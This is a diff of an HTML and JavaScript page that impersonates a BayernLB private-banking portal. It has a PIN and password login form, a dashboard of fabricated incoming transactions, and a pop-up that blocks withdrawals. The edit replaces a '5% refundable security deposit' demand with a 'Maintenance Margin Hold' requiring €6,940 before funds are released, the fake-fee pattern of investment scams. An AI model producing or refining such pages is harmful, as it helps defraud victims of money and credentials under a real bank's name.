@@ -78,10 +78,10 @@
             background: #fff;
             padding: 30px;
             border-radius: 4px;
-            width: 450px;
+            width: 500px;
             border-top: 6px solid var(--danger);
             box-shadow: 0 20px 50px rgba(0,0,0,0.2);
-            text-align: center;
+            text-align: left;
         }
         .modal-title {
             color: var(--danger);
@@ -90,14 +90,16 @@
             margin-top: 0;
             margin-bottom: 15px;
             text-transform: uppercase;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
         }
         .modal-body {
             color: #333;
-            font-size: 16px;
-            line-height: 1.5;
+            font-size: 15px;
+            line-height: 1.6;
             margin-bottom: 25px;
-            text-align: left;
         }
+        .modal-body strong { color: var(--danger); }
         .modal-btn {
             background: var(--danger);
             color: white;
@@ -151,9 +153,11 @@
             <label id="txt-label-pass">PIN / PASSWORT</label>
             <input type="password" id="pass" placeholder="••••••••">
         </div>
-        <button class="btn-submit" id="txt-btn-auth" onclick="attemptLogin()">LOGIN BESTÄTIGEN</button>
+        <button class="btn-submit" class="btn-submit" id="txt-btn-auth" onclick="attemptLogin()">LOGIN BESTÄTIGEN</button>
     </div>
-</section><section id="dashboard-container">
+</section>
+
+<section id="dashboard-container">
     <div class="sidebar">
         <div class="sidebar-brand">BayernLB - Private</div>
         <div class="sidebar-item active" id="nav-synth" onclick="navigateTo('synth')">Finanzstatus</div>
@@ -178,7 +182,7 @@
                         <tr id="txt-table-head"><th>BUCHUNGSTAG</th><th>VERWENDUNGSZWECK</th><th>BETRAG</th></tr>
                     </thead>
                     <tbody id="trans-body">
-                        <tr><td>23.09.2026</td><td>Blockchain return</td><td class="amt-pos">+30.582,00 €</td></tr>
+                        <tr><td>23.09.2026</td><td>Maintenance margin coverage</td><td class="amt-pos">+2.346,00 EUR</td></tr>
                         <tr><td>09.09.2026</td><td>Quantiumax Investment Bank / Barclays Bank<span class="details">GB97 0024 1153 8560 0000</span></td><td class="amt-pos">+24.639,00 €</td></tr>
                     </tbody>
                 </table>
@@ -218,8 +222,13 @@
 <!-- Security Deposit Modal -->
 <div id="security-modal" class="modal-overlay">
     <div class="modal-box">
-        <h3 class="modal-title">WARNING</h3>
-        <p class="modal-body">A fully refundable security deposit of 5% is required for the transaction. Please deposit €2,892.00.</p>
+        <h3 class="modal-title">Withdrawal Restriction – Maintenance Margin Hold</h3>
+        <p class="modal-body">
+            Your withdrawal request cannot be processed at this time due to a <strong>Maintenance Margin Hold</strong> on your account. 
+            A required Maintenance Margin of 12% of the total account balance, amounting to <strong>€6,940.00</strong>, must be satisfied before the withdrawal can be released.
+            <br><br>
+            <em>Contact Customer Support.</em>
+        </p>
         <button class="modal-btn" onclick="closeSecurityModal()">Understood</button>
     </div>
 </div>
@@ -316,7 +325,7 @@
         
         // Update Transactions with new data
         const rows = `
-            <tr><td>23.09.2026</td><td>Blockchain return</td><td class="amt-pos">+30.582,000 €</td></tr>
+            <tr><td>23.09.2026</td><td>Maintenance margin coverage</td><td class="amt-pos">+2.346,00 EUR</td></tr>
             <tr><td>09.09.2026</td><td>Quantiumax Investment Bank / Barclays Bank<span class="details">GB97 0024 1153 8560 0000</span></td><td class="amt-pos">+24.639,00 €</td></tr>
         `;
         document.getElementById('trans-body').innerHTML = rows;
